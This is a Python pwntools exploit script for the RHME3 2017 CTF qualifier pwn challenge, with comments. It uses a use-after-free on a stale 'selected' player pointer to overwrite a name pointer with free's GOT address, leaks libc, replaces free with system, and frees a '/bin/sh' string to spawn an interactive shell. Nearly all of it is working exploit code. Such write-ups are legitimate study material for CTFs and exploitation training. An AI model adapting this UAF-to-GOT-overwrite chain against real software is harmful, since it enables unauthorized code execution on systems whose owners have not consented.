#
# RHME3 Qual 2017 pwn
#
# Based on 
# * https://github.com/ResultsMayVary/ctf/RHME3
#

from pwn import *
import re

b = ELF('./main')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.arch = b.arch
context.log_level = 'info'

r = process('./main')

def add(name, marker):
    r.send('1\n')
    r.recvuntil('Enter player name:')
    r.send(name + '\n')
    r.recvuntil('Enter attack points:')
    r.send(str(marker))
    r.recvuntil('Enter defense points:')
    r.send(str(marker))
    r.recvuntil('Enter speed:')
    r.send(str(marker))
    r.recvuntil('Enter precision:')
    r.send(str(marker))
    r.recvuntil('Your choice:')

def remove(idx):
    r.send('2\n')
    r.recvuntil('Enter index:')
    r.send(str(idx) + '\n')
    r.recvuntil('Your choice:')

def select(idx):
    r.send('3\n')
    r.recvuntil('Enter index:')
    r.send(str(idx) + '\n')
    r.recvuntil('Your choice:')

def show_player():
    r.send('5\n')
    return r.recvuntil('Your choice:')
    
def edit(name):
    r.send('4\n')
    r.recvuntil('Your choice:')
    r.send('1\n')
    r.recvuntil('Enter new name:')
    r.send(name + '\n')
    r.recvuntil('Your choice:')
    r.send('0\n')
    r.recvuntil('Your choice:')

def hex_dump(s):
    return ":".join("{:02x}".format(ord(c)) for c in s)

if __name__ == "__main__":
    r.recvuntil('Your choice:')

    add('A'*200, 0xc7) # chunk A-1,A-2
    add('B'*200, 0xc8) # chunk B-1,B-2
    add('C'*200, 0xc9) # chunk C-1,C-2
    raw_input('after adding ABC...')

    select(0)

    remove(0)
    raw_input('after removing A...')
    remove(1)
    raw_input('after removing B...')

    # chunk C-2 gets merged with top_chunk
    # chunk C-1 goes into fastbin
    remove(2)                           
    raw_input('after removing C...')

    # delete_player() should have set 'selected' to NULL, but it didn't.
    # set_name() references the variable 'selected' even after the chunk it points has gone! (UaF)
    #
    # typedef struct _player_st { _DWORD attack, defense, speed, precision; char * name_ptr } player_st;
    #
    # add_player() allocates two chunks, payer_st and name. 
    # -> malloc(sizeof(player_st)) -> 24 bytes from LIFO fastbin (previous chunk C-1)
    # -> malloc("EEEE....EEEE" + "\x18\x30\x60") -> 16+3+1 bytes from unsorted bin (previous chunk A-1)
    # so, chunk A-1 which has been deleted overlaps with chunk E-2 (player name "EEEEE....")
    # and we can still access chunk A-1 via 'selected'
    # and a carefully crafted name for chunk E will overwrite chunk A-1's name_ptr
    # and 'selected' still points chunk A-1
    # so future set_name() call which references 'selected' will use the overwritten pointer, name_ptr.

    add('E'*16 + p64(b.got['free']), 0xfe)              # overwrite selected->name_ptr with 0x603018 (GOT of free)
    raw_input('after adding E...')

    resp = show_player()
    l = re.findall(r"Name: (.+)", resp)[0]
    print hex_dump(l)
    l += '\x00\x00'
    l = u64(l)
    log.info("free offset: 0x%016x" % l)
    libc_addr = l - libc.symbols['free']
    log.info("libc offset: 0x%016x" % libc_addr)
    system_addr = libc_addr + libc.symbols['system']
    log.info("system offset: 0x%016x" % system_addr)
    
    raw_input('before edit name...')

    edit(p64(system_addr))                              # selected->name_ptr is 0x603018 -> strcpy(0x603018, system_addr)

    raw_input('after editing...')

    add('/bin/sh', 0xff)

    raw_input('after adding /bin/sh...')
    r.send('2\n1\n')                                    # delete_player() will try to free("/bin/sh") which becomes system("/bin/sh")

    r.interactive()
